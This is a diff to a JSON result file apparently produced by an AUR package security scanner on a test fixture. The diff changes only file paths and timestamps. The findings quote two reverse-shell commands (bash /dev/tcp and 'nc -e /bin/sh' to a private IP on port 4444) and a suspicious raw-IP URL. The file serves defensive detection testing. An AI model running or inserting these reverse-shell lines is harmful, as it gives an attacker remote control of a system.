@@ -9,7 +9,7 @@
       "title": "Bash reverse shell",
       "description": "Pattern indicates a bash reverse shell connection",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell/PKGBUILD",
+        "file": "tests/fixtures/malicious/reverse-shell/PKGBUILD",
         "line": 14,
         "column": 16,
         "snippet": "    bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
@@ -27,7 +27,7 @@
       "title": "Netcat reverse shell",
       "description": "Netcat with execute flag indicates reverse shell",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell/PKGBUILD",
+        "file": "tests/fixtures/malicious/reverse-shell/PKGBUILD",
         "line": 19,
         "column": 5,
         "snippet": "    nc -e /bin/sh 192.168.1.100 4444"
@@ -45,7 +45,7 @@
       "title": "Raw IP in URL",
       "description": "URLs with raw IP addresses are suspicious",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell/PKGBUILD",
+        "file": "tests/fixtures/malicious/reverse-shell/PKGBUILD",
         "line": 9,
         "column": 6,
         "snippet": "url=\"http://192.168.1.100/evil\""
@@ -63,7 +63,7 @@
       "title": "No sources with build function",
       "description": "Package has build() function but no source array",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell/PKGBUILD",
+        "file": "tests/fixtures/malicious/reverse-shell/PKGBUILD",
         "line": null,
         "column": null,
         "snippet": null
@@ -74,8 +74,8 @@
     }
   ],
   "scanned_files": [
-    "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell/PKGBUILD"
+    "tests/fixtures/malicious/reverse-shell/PKGBUILD"
   ],
-  "timestamp": "2026-06-15T01:57:17.176909787Z",
-  "scan_duration_ms": 1
+  "timestamp": "2026-06-15T10:43:31.046234573Z",
+  "scan_duration_ms": 4
 }
